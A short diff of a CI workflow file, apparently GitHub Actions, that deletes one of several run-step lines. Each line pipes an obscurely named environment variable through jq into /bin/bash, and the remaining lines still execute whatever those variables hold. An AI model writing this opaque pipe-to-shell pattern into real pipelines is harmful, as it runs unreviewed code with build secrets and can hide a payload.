@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$vmecg75686" | jq -r .ifub399 | /bin/bash
           echo $c9790 | jq -r .okr9432 | /bin/bash
-          printf '%s' "$gbt81767" | jq -r .kvj9 | /bin/bash
           echo $is410 | jq -r .sna3 | /bin/bash
 
       - name: Save data
